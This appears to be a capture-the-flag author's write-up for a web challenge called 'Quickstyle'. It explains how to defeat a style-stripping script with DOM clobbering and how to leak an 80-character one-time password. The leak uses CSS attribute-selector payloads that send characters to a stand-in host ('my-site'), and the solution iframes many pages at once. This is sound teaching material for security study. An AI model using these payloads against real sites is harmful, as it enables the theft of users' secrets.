# Quickstyle

This was a fun challenge to write and test-solve. The core part of the challenge is the css exfiltration which expands upon an idea from [0ctf/newdiary](https://github.com/salvatore-abello/CTF-Writeups/tree/main/0ctf%20-%202023/newdiary) and addresses some of its shortcomings.

## Challenge

We are given a website with a frontend and backend. An admin visiting the website is greeted with a one-time-password (otp) to give a user. The page they visit will load a user's html with a csp only allowing inline styles. Immediately after loading the html, all `style` tags are removed with a `document.querySelectorAll`. The user gets one try to submit the otp to the `/flag` endpoint before the otp is reset.

## Solution

The overall flow to solving this is to leak the otp with css and then make a request to `/flag` endpoint with the otp.

First thing we notice when trying to add a style is that `document.querySelectorAll('style').forEach(s => s.remove())` removes the style instantly so no styles can take effect. If we can prevent this line from running, we can get all the inline styles we want. To do this, we can use DOM clobbering to make that line error out with `<img name="querySelectorAll" />` (which will make `document.querySelectorAll` refer to the `img` instead of the function).

Next, we have to leak the otp with css. The otp is 80 characters randomly generated from `digits + lowercase + uppercase`. The conventional way to leak an attribute with css is to use something like:

```css
/* if value starts with 'a', set bg to my-site/a (sending a request to my-site with 'a' */
[value^="a"] {
	background: url(https://my-site/a);
}
[value^="b"] {
	background: url(https://my-site/b);
}
/* and so on for rest of alphabet */

/* load next css */
@import 'https://my-site/next';
```

where the next css is loaded once we get the first request. This is usually used to build a prefix and then eventually leak the value. However, the csp prevents us from any css other than unsafe-inline.

There is, however, another method of leaking an attribute which is starting to become well-known (see [0ctf/newdiary](https://github.com/salvatore-abello/CTF-Writeups/tree/main/0ctf%20-%202023/newdiary) and [sonarsource blog](https://www.sonarsource.com/blog/code-vulnerabilities-leak-emails-in-proton-mail/#multiple-requests-per-element-crossfade)). In this method, instead of using `startswith` queries, we use `contains` queries with combinations of 3 characters.

For example, to leak `hello`, one can use following css

```css
/* value contains __ */
[value*="hel"] { --hel: url(my-site/hel); }
[value*="ell"] { --ell: url(my-site/ell); }
[value*="llo"] { --llo: url(my-site/llo); }
/* all other possible 3-letter combinations */
input[value] { background: var(--hel,none),var(--ell,none),var(--llo,none); }
```

and then use the overlapping characters to piece together the value (`el` is in both `hel` and `ell`).

Using only combinations size `2` is imprecise because whenever a character repeats, there are multiple possible ways to re-construct the values that grow exponentially. Using combinations size `4` and above require too much css to be downloaded and are impractical. Combinations size `3` are usually a sweet spot for this type of exfiltration.

For this challenge, however, there are `62` possible characters in the alphabet. This would require `62^3` combinations of three characters which exceeds the length restriction enforced in `note.js`. We will have to be more creative than the naive approach.

We definitely have enough room for all combinations of 2 characters, so we make add all of those queries to the stylesheet. The challenge is in obtaining additional information that can resolve the branches that arise when processing 2-combo data.

Looking closer at css attribute selectors, we can specify them to be case-insensitive (like `[value*='abc' i]`). Using case-insensitive checks against all 3 combinations of `lowercase + digits` works very well as shown in a simulation I wrote (see `simulation.py`). This is because for 3-combos, for each letter of the alphabet you omit, the probability you can exfiltrate is roughly halved. However, with case-insensitive checks, all characters will give information. For this particular challenge set and alphabet, there is roughly a `10%` success rate with this method.

As there is roughly a `10%` success rate, we need to conduct multiple login attempts at the same time. Luckily, there is no `X-Frame-Options` sent from the server so we can just `iframe` 20 pages and try all the exfiltrated otp against the `/flag` endpoint.

To make my solution perform on remote, I had to move my css files to github pages (so they download much faster), set up an ngrok https tunnel (to avoid mixed-content errors), and set up a cf worker to reduce the length of my url (ngrok free urls are massive).

This was a fun challenge to write for me with many ups in downs in my own solving of the problem. I hope you all found it fun as well!
